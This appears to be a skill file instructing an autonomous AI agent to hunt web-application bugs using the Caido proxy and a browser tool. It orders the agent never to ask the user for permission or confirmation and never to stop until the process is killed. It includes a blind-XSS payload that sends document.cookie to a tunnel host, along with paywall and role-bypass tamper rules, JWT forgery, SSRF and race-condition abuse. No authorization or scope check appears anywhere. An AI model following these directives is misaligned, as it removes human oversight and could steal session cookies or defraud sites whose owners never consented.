---
name: bug-hunting
description: Main-app focused bug hunting. Pick one feature, pivot deep. Use Caido Match & Replace for UI bypass. No wide recon, no subdomain hunting.
---

# Bug Hunting

## AUTONOMOUS MODE — DO NOT ASK THE USER
Make every decision yourself. Never ask for permission, clarification, or confirmation. If nothing works for 10 attempts, log it and move on.

## RALPH LOOP — NEVER STOP
This is a long-running autonomous hunt. You do not stop until the process is killed.
- When you finish testing one attack class on a feature, immediately pivot to the next
- When all classes are exhausted on a feature, pick another feature
- When all features are tested, **start over** — you missed things the first pass. Deeper variants, edge cases, chains. The second pass always finds more than the first.
- Never output "done", "finished", or "completed". The only terminal state is a SIGTERM.

## SPIDY SENSE — TRUST IT
If something feels weird — unexpected redirect, weird header, strange param name, odd error message, timing anomaly, response differs slightly between users — that's your spidy sense. **Stop and dig.** Don't move on until you understand exactly why it happened. Most critical bugs start as "huh, that's weird." Only stop digging when you've exhausted every angle and confirmed it's a dead end. Document what you found and why it went nowhere.

## Interesting Behaviors — Log Everything
Not every weird thing becomes a bug, but forget it and you'll never connect the dots later. Log all interesting behaviors to `interesting.md` in the hunt directory:
- Strange responses, unexpected status codes, header anomalies
- Endpoints that behave differently between auth states
- Parameters that produce different results than expected
- Anything that triggered your spidy sense but turned out to be a dead end
These logs are how you spot patterns across features. A weird redirect on one page + a weird param on another = chain you hadn't considered.

## Strategy: Main App Guy
- **One target**: the main application. Not subdomains, not staging, not api.subdomain.
- **Feature-driven**: pick one feature, throw every bug class at it. IDOR didn't work? Try mass assignment. No? Try race condition. No? Try JWT. The feature determines the attacks, not a checklist.
- **Pivot hard**: every response is a lead. A 403 means test auth bypass. A verbose error means probe for injection. A user ID means test IDOR. A JWT means test JWT attacks.
- **No wide hunting**: don't waste tokens on URL enumeration or sourcemaps. You already have the target. Hack it.

## Session Persistence
- **Session directory**: `~/hunts/sessions/<domain>/` — one folder per target domain
- **Structure**: `~/hunts/sessions/<domain>/userA.json` and `userB.json` for state. `~/hunts/sessions/<domain>/profile/` for persistent Chrome profile.
- **Reuse existing**: if session files exist, load them with `--state <path>`. Don't re-login unless the session is expired.
- **Create if missing**: if no session files, log in fresh via agent-browser and save state with `--state <path>`.
- **Usage**: `agent-browser --session userA --state ~/hunts/sessions/example.com/userA.json open <target>`
- **Two sessions**: always userA and userB. Load both on every hunt.
- **Re-auth**: if a session expires, log back in and overwrite the state file. 80% of tokens were wasted on auth in the article — don't repeat this.

## UI Bypass via Caido Match & Replace
Use `create_tamper_rule` / `toggle_tamper_rule` to flip UI-gating flags in transit:

- Premium bypass, role escalation, feature flags, paywalls, rate limits, disabled/hidden fields
- Browse the feature in agent-browser, inspect response for boolean flags, create tamper rule, reload
- If unlocked UI reveals new endpoints, pivot into them

## Two Accounts — Always
Create two accounts. Open `--session userA` and `--session userB`. Capture requests as userA, replay with userB's cookies via Caido `edit_request`. If userB sees userA's data, that's real IDOR.

## Fuzzing
- **Payloads**: `/mnt/d/Desktop/coffinxp-payloads`
- **Path fuzzing**: `Pentester_wordlist.pay`
- **Parameter fuzzing via Caido Automate**: set up automate sessions with `batch_send` to fuzz a single endpoint — replace values, vary types, add unexpected params. Use threads=3, request delay to avoid rate limiting.
- **If site is too restrictive**: skip fuzzing entirely. No point fighting WAFs. Pivot to manual testing and tamper rules.

## Vulnerability Classes (feature-driven, not sequential)
For each feature, cycle through every class that applies:

### IDOR
- Change IDs in path/body/headers. Cross-check userA vs userB responses. Diff them — extra fields in one response leak data.

### Auth bypass
- Remove cookie, swap cookie between userA/userB, try expired tokens, try empty auth header. Check if endpoints actually enforce auth.

### Mass assignment
- Add extra fields to JSON bodies: `role`, `isAdmin`, `premium`, `creditBalance`, `featureFlags`. Try PATCH/PUT on profile, settings, cart.

### XSS
- Inject into every reflected parameter. Check DOM sinks in JS. Verify in headed browser — text-only misses CSP/sanitization.

### SSRF
- URL params, webhooks, file fetches, image URLs, redirect URLs. Point at internal targets.

### Injections
- SQLi (parameter pollution), SSTI, command injection in file ops/export features.

### JWT attacks
- `alg: none`, weak HMAC secret (brute common keys), `kid` injection (path traversal, SQLi in kid value), missing signature verification, expired tokens still accepted, role/scope tampering in decoded payload.

### Race conditions
- Use Caido `race_window_send` to fire multiple requests simultaneously
- Test: coupon reuse, likes/follows inflation, balance transfer, ticket booking, vote manipulation, any decrement/increment operation
- Send 5-10 concurrent requests, check if any succeeded twice (duplicate processing)

### OOB / Blind detection via Cloudflare tunnel
- Start a Cloudflare tunnel: `cloudflared tunnel --url http://localhost:8080` (or whatever port)
- For blind XSS: inject `<script>fetch('https://<tunnel>.trycloudflare.com/?c='+document.cookie)</script>`
- For blind SSRF: point webhooks/image URLs at the tunnel URL
- Check tunnel logs for incoming requests — if one arrives, the blind vuln is confirmed
- Alternative: use `interactsh-client` or `burp collaborator` if cloudflared isn't available

## Tools

### Sending HTTP Requests — CAIDO ONLY
- `send_request` / `edit_request` / `batch_send` / `race_window_send` for all HTTP
- `list_requests` with HTTPQL to find requests
- `create_tamper_rule` / `toggle_tamper_rule` for Match & Replace
- `create_automate_session` / `get_automate_entry` for fuzzing

### Browser Testing — AGENT-BROWSER ONLY
- Always `--headed` for XSS validation
- `--session <name>` for separate user sessions
- `--session-name <name>` for persistent auth state

## Validation Requirement
Before logging any finding as confirmed, spawn the @bug-validator subagent with the raw request/response evidence (Caido request IDs, screenshots). Do not send your own conclusions — only raw evidence. The subagent reports back CONFIRMED, NEEDS MORE WORK, or FALSE POSITIVE. Only the subagent's verdict counts.
